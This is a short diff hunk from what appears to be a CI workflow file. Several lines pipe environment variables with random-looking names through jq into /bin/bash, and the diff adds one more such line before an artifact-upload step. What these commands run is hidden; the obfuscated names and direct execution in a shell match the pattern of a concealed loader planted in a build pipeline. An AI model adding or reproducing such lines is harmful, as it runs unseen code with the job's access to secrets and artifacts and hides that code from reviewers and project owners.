@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$dj2080" | jq -r .nqfao4 | /bin/bash
           echo $dufkm29 | jq -r .udbxd27 | /bin/bash
           echo $oonp7 | jq -r .atfkr1468 | /bin/bash
+          echo $qbfna77 | jq -r .ex8 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
